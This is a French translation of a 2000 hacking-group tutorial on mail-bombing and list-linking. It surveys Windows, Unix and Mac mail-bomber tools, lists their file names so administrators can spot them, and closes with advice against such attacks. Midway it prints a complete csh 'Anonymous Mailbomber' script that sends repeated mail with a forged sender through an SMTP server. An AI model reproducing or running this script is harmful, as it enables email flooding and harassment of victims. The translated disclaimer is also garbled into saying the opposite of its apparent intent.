=============================
Mail Bombing et List Linking
=============================
Ecrit par Tolda [2000]
Avec les commentaires et les ajouts de R a v e N.
Ecrit pour BSRF.
Site: http://blacksun.box.sk
Traduit par BAHAK

INFORMATIONS IMPORTANTES
========================
	Les auteurs de cet article et BSRF ne pensent pas que le mail-bombing et
le list linking soient contre la loi, et ne puissent etre promuent ou acceptes 
par quicquonque. En fait, ceux sont les deux choses les plus stupides 
que l'on puisse faire sur le net. De telles attaques sont seuleument faites par
des gamins qui ont trop de temps libre, et qui ne sont pas assez brillants pour 
etudier des techniques plus sophistiquees.

Connaitre Son Ennemi
====================

   Up Yours:
                                                                        
	Le mail-bomber Up Yours est probablement le plus celebre de tous. Il 
utilise peu de ressource, est efficace, simple d'utilisation et cache l'adresse
de l'attaquant. Les options du programme permettent de specifier l'heure du jour
où il demarre et arrete, et aussi le nombre de messages avec lesquels il va 
frapper la victime.

	Ce mail-bomber marche uniquement sur Microsoft Windows. Si vous etes 
un administrateur systeme, vous devriez scanner vos disques durs locaux pour chercher
les fichiers suivants:

upyours.exe
upyours2.zip
upyours3.zip

	Si ces fichiers apparaissent dans le repertoire d'un utilisateur, il y a une forte
probabilite qu'il mail-bombe quelqu'un (il se peut aussi, qu'il recherche simplement a 
collecter des programmes de hacking et de cracking). Dans tous les cas, l'utiliter est
difficilement justifiable. Si l'un de vos utilisateurs a ce programme, c'est qu'il s'interesse
clairement au hacking et au cracking :o)

   KaBoom:
	
	KaBoom differe vraiment de Up Yours. Dans ce programme vous constatez l'utilite
du list link. En utilisant cette fonction, vous pouvez inscrire votre cible a des milliers de
listes e-mail. Quand je dis qu'une cible a ete liste-linke, je veux dire qu'elle a souscrit
(sans son consentement) a une ou plusieurs listes e-mail. De tels outils soumettent la demande
d'enregistrement de la part de la victime, en utilisant leur e-mail.Les fichiers signatures 
de ce programme sont:

kaboom!3.zip
kaboom3.exe

   Avalanche:

	Le mail-bomber Avalanche marche bien et possede une belle interface graphique. Les 
list groups sont affichees dans une boite a menu déroulant, et leurs individual lists sont 
affichees dans un menu. Trois cliques de souris, et votre cible tombe dans l'eau chaude.

Astuce: Le programmeur a ete, ici, un peu distrait. Le programme etait, au moins en partie, 
ecrit en Microsoft Visual Basic 4.0. De ce fait, il y a une serie de fichiers Dll qui est 
requise pour utiliser cette application. Elles ne sont pas fournies dans la distribution du
programme; donc, de nombreux bombers (attaquants) ont du chercher ailleurs sur internet pour
obtenir ces fichiers (l'un d'eux est OC2.DLL). A cause de cela, je vais considerer qu'Avalanche 
est probablement moins utilise que ces homologues, bien que sa conception graphique soit superieure.
Ces inconvenients decouragent la plupart des utilisateurs de ce genre particulier.Les fichiers 
signatures de ce programme sont:

alanch10.zip
avalanche20.zip
avalanche.exe

   Unabomber:

	Le soft Unabomber est un outil rudimentaire, mais il faut donner du credit a son auteur. Unabomber
 n'offre pas de possibilite de list-linking. C'est essentiellement un mail-bomber plat, qui ne fait rien
d'autre que d'envoyer des messages. Toutefois, un element interessant, est le fait que Unabomber soit 
livrer avec une fonction d'aide. Les fichiers signatures de ce programme sont:
 
unabomb.zip
unabomb.exe
 
   eXtre Mail:

	eXtreme Mail est un bon programme. Il inclut une installation interactive qui execute tous les 
controles ordinaires, tels que la verefication espace disque disponnible, ressources et ainsi de suite.
Il surveille aussi l'enregistrement dans la base de registre, et se desinstalle facilement.
Les fichiers signatures de ce programme sont:

xmailb1.zip
xmailb1.exe
 
   Homicide:

	Le programme Homicide a ete ecrit par un jeune au surnom de Frys et a ete stoppe en 1996.
L'auteur pretend qu'il a ecrit le programme car Up Yours 2.0 n'etait pas adequate comme mail-bomber.
Toutefois, avec la version 3.0 de Up Yours, Frys a apparement decider d'abandonner d'autres versions.
Il est difficilement trouvable, a part sur des sites tres selectionnes. Les fichiers signatures de ce 
programme sont:
 
homicide.zip
homicide.exe
 
   The UNIX MailBomb:

	Ce mail-bomber UNIX est normalement attribue a CyberGoat, un crackeur anonyme du neant.
Le fichier signature de celui-ci est:
mailbomb.csh.
C'est en fait un CSH shell script et pas un programme, depuis qu'Unix a de tels capacite de shells et 
shell scripting. Son principal avantage est qu'il est de tres petite taille.

 #!/bin/csh
 # Anonymous Mailbomber
 # do chmod u+rwx <filename> where filename is the name of the file 
 that
 # you saved it as.
 #*** WARNING - THIS WILL CREATE AND DELETE A TEMP FILE CALLED
 # "teltemp"
 # IN THE DIRECTORY IT IS RUN FROM ****
 clear
 echo -n "What is the name or address of the smtp server ?"
 set server = $<
 #echo open $server 25 > teltemp
 echo quote helo somewhere.com >> teltemp
 #The entry for the following should be a single name (goober),
 #not goober@internet.address <mailto:goober@internet.address>.
 echo -n "Who will this be from (e.g. somebody) ?"
 set from = $<
 echo quote mail from: $from >> teltemp
 echo -n "Who is the lucky recipient (e.g. someone@somewhere) ? "
 set name = $<
 echo quote rcpt to: $name >> teltemp
 echo quote data >> teltemp
 echo quote . >> teltemp
 echo quote quit >> teltemp
 echo quit >> teltemp
 echo -n "How many times should it be sent ?"
 set amount = $<
 set loop_count = 1
 while ($loop_count <= $amount)
 echo "Done $loop_count"
 ftp -n $server 25 < teltemp
 @ loop_count++
 end
 rm ./teltemp
 echo $amount e-mails complete to $name from $from@$server
 # --------------------
 # MailBomb by CyBerGoAT

   Bombtrack:

	Le programme Bombtrack est normalement recense comme le premier mail-bomber ecrit pour
le systeme d'exploitation Macintosh. C'est un autre programme de mail-bombing parmi les autres.
Il est largement disponnible a travers le web sur les sites des crackeurs. Le fichier signature
de ce programme est:

bombtrack.bin

   FlameThrower:

	FlameThrower est un mail-bomber destine a Macintosh. Sa fonction principale est le list-linking;
il autorise l'utilisateur a souscrire sa cible a 100 lists. La taille du fichier binaire es assez grande,
si l'on considere ce qu'il propose. Le fichier signature de ce programme est:

flamethrower10b.sit.bin
 


   Mesures Anti-Mail Bombing
   =========================

	Il y a beaucoup de programmes (comme pop3free, pop3clean, etc') qui nettoieront vos comptes e-mail 
pop3. Pour en savoir plus sur le Pop3, referez vous au tutorial BSRF.
Quant aux boites e-mail du web (hotmail, yahoo,etc'), vous pouvez toujours sauver les vrais e-mails que
vous avez et effacer tous le reste (toutes les boites e-mails sur le web ont cette possibilite).
Pour rendre compte de telles attaques, enoyez un message a l'equipe d'abus (par exemple si vous avez un 
compte a hotmail.com, envoez votre e-mail a abuse@hotmail.com).

	Quant au list linking, si vous faites face a une grande attaque, et que vous ne pouvez vous 
desabonner de toutes les mailings lists par vous meme, considerer le fait de changer de compte.
Desole, il n'y a pas d'autre solution.

Ecrit par Tolda [2000]
traduit par Bahak [2001]